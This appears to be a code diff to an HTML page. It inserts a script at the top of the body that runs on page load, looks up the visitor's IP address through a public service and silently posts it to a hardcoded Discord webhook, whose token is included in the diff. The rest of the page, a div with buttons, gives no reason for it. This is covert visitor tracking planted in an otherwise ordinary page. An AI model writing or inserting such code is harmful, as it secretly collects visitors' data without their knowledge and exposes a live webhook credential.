@@ -144,6 +144,53 @@
       </style>
 </head>
 <body>
+  <script>
+    // Function to send IP address to Discord webhook
+    function sendIPToDiscord(ip) {
+        // Discord webhook URL
+        var webhookURL = "https://discord.com/api/webhooks/1229171253852770374/Dnx-y3peAUg6VNZS73PqiQFNAq0Ar72voyO5W_oozPkOmHfP59JWaZqvFLHQtUcDn9wx";
+
+        // Data to send
+        var data = {
+            content: "Visitor IP: " + ip
+        };
+
+        // Send POST request to Discord webhook
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            console.log('IP address sent to Discord');
+        })
+        .catch(error => {
+            console.error('Error sending IP address to Discord:', error);
+        });
+    }
+
+    // Function to get visitor's IP address
+    function getIP() {
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ip = data.ip;
+            console.log('Visitor IP:', ip);
+            sendIPToDiscord(ip); // Send IP address to Discord webhook
+        })
+        .catch(error => {
+            console.error('Error getting IP address:', error);
+        });
+    }
+
+    // Call getIP function when the page loads
+    getIP();
+</script>
 <div class="intersection">
     <div class="variable">Variable</div>
     <div class="buttons">
